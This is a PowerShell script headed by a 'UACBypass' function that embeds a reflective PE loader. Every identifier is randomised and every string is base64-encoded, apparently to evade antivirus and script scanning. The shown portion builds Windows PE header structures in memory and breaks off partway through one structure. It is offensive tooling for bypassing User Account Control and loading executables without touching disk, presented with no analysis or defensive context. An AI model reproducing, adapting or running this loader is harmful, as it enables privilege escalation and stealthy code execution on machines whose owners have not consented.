﻿function UACBypass
{
    param(
        [String]
        $command,
        [Int]
        $number
    )
function c6b6b70a989c48afb55d0747cd50e5fb
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${c8e0d86ea0e74817acb552fc5014588b},
	[Parameter(Position = 1)]
	[String[]]
	${d2da5a44b3624cd4b8654ec2e55219a6},
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	${dc106e3370e342d583b546e4de5c6324} = 'Void',
	[Parameter(Position = 3)]
	[String]
	${e6db2bb213e84f06b160fdf34abced4c},
	[Parameter(Position = 4)]
	[Int32]
	${d7dce71817674a8cb3038e161abf3313},
	[Parameter(Position = 5)]
	[String]
	${c9c96b577e0a468286181674ff067853},
    [Switch]
    ${aa082364f7c3405b8c53e70e1ebc7a97},
	[Switch]
	${aba1458cbbcf4013af75a20e17d74ec2}
)
Set-StrictMode -Version 2
${188b2d8d67304cdb8a18cedc298645cb} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${c8e0d86ea0e74817acb552fc5014588b},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${dc106e3370e342d583b546e4de5c6324},
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		${d7dce71817674a8cb3038e161abf3313},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${c9c96b577e0a468286181674ff067853},
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        ${aa082364f7c3405b8c53e70e1ebc7a97}
	)
	Function c1f42a3f37b440c28548cfb7f311709b
	{
		$Win32Types = New-Object System.Object
		${e21330ab334d4b779edeb53d24bb8eef} = [AppDomain]::CurrentDomain
		${12b7e7bef84049e0be874c4d2e24e9de} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${fdbfd1638c4944af877d03a4a655abc8} = ${e21330ab334d4b779edeb53d24bb8eef}.DefineDynamicAssembly(${12b7e7bef84049e0be874c4d2e24e9de}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${fe58a05b9eeb4744b1b654a407ed5d8e} = ${fdbfd1638c4944af877d03a4a655abc8}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${d62dfb307105443cae2691a91b9da16f} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${a17a1cd824064e04839bc4a083739965} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${a17a1cd824064e04839bc4a083739965}
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${25131369361d43dc8654a88fe9f879cf} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${25131369361d43dc8654a88fe9f879cf}
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${41668aabe6d444c3a0f04c3ab231fdf8} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${41668aabe6d444c3a0f04c3ab231fdf8}
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${2a3382eabcf54f4883ecb89229db7085} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${2a3382eabcf54f4883ecb89229db7085}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 8)
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${efe52fb6628d4bb4ac2d0aa0fddcd39c} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${efe52fb6628d4bb4ac2d0aa0fddcd39c}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 20)
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${3d9691ca995a4dc0934eb813bd1040ec} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${3d9691ca995a4dc0934eb813bd1040ec}
		${5398a081b60e43169082282ccf99906e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${5398a081b60e43169082282ccf99906e}, [System.ValueType], 240)
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${25131369361d43dc8654a88fe9f879cf}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${41668aabe6d444c3a0f04c3ab231fdf8}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${2a3382eabcf54f4883ecb89229db7085}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
